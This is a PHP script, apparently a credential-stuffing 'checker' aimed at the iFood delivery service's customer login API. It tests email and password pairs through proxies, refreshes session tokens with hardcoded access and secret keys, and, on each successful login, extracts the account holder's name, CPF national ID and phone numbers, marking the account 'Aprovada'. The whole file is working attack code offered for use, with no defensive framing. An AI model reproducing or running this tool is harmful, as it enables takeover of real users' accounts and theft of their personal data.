<?php

/*
 * Projeto Ifood
 * Copie oque eu faço, Mas não pode copiar oque sei fazer
 * Copyright [#ExplicitChecker] 11/2017 by: Thiagão
 * Discord: Thiaga1#3174
 */

include 'functions.php';

function _curl($url, $post = false, $header = array(), $header_out = true, $follow_loc = true, $json = false) {
    global $ckfile;
    $ch = curl_init();
    if ($post) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    }
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, $header_out);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, $follow_loc);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    if (!is_array($header)) {
        $header = (array) $header;
    }
    $headers = array(
        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
        'Connection: Keep-Alive'
    );
    $headers = array_merge($headers, $header);
    $headers_j = array(
        'Content-Type: application/json; charset=UTF-8',
        'Connection: Keep-Alive'
    );
    $headers_j = array_merge($headers_j, $header);
    if ($json) {
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers_j);
    } else {
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    }
    curl_setopt($ch, CURLOPT_COOKIEJAR, $ckfile);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $ckfile);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

if (isset($_GET['lista']) and isset($_GET['proxy'])) {
    extract($_GET);
    $explode = multiexplode(array(";", "»", "|", ":", " "), $lista);
    $explode = array_values(array_filter($explode));
    @$email = trim($explode[0]);
    @$senha = trim($explode[1]);
    $t = $email . " » " . $senha;
    if (empty($email)) {
        reprovadas("<span class='label label-danger'>Email Invalido ✘</span> |  {$t} </b></div>");
    } elseif (empty($senha)) {
        reprovadas("<span class='label label-danger'>Senha Invalida ✘</span> |  {$t} </b></div>");
    }



    $resultado = _curl_proxy('http://wsloja.ifood.com.br/ifood-ws-v3/customer/authenticate', "type=LOGIN&email=$email&password=$senha&externalToken=null", array("session_token: " . file_get_contents('arquivos/session_token'), 'Country: BR', 'Accept-Language: pt_BR'), $proxy, false);
    if (strpos($resultado, '"code":"102"')) {
        $resultado = _curl_proxy('http://wsloja.ifood.com.br/ifood-ws-v3/app/config', false, array("access_key: 9b521711-406f-4081-9ad9-21c1f477bb73", "secret_key: 79191ba9-8f6f-44b5-929f-64a31c37528b"), $proxy);

        file_put_contents('arquivos/session_token', getStr($resultado, 'Set-Cookie: session_token=', "\r"));
        $resultado = _curl_proxy('http://wsloja.ifood.com.br/ifood-ws-v3/customer/authenticate', "type=LOGIN&email=$email&password=$senha&externalToken=null", array("session_token: " . file_get_contents('arquivos/session_token'), 'Country: BR', 'Accept-Language: pt_BR'), $proxy, false);
    }



    if (strpos($resultado, 'loginToken')) {
        $json = json_decode($resultado, true);
        $nome = $json['data']['account']['name'];
        $cpf = $json['data']['account']['cpf'];
        if (count($json['data']['account']['phones']) <> 0) {
            $telefones = array();
            foreach ($json['data']['account']['phones'] as $telefone) {
                $telefones [] = "(" . $telefone['areaCode'] . ") " . $telefone['phone'];
            }
        }
        $nome = ($nome) ? "| Nome: <span class='label bg-green'>$nome</span>" : "";
        $cpf = ($cpf) ? "| CPF: <span class='label label-default'>$cpf</span>" : "";

        $nandatebaio = (count($telefones) > 1) ? "Telefones" : "Telefone"; //Multiplos telefones
        $telefones = ($telefones) ? "| $nandatebaio: <span class='label bg-blue'>" . implode(', ', $telefones) . "</span>" : "";

        aprovadas("<span class='label label-success'>#Aprovada</span>  <b> | {$t} $nome $cpf $telefones</b>");
    } elseif (strpos($resultado, '"code":"100"')) {
        $json = json_decode($resultado, true);
        reprovadas("<span class='label label-danger'>Reprovada ✘</span>   |  {$t} | Retorno: <span class='label bg-red'>$json[message]</span>");
    } else {

        reprovadas("<span class='label label-danger'>Erro ✘</span>  |  {$t} ");
    }
}
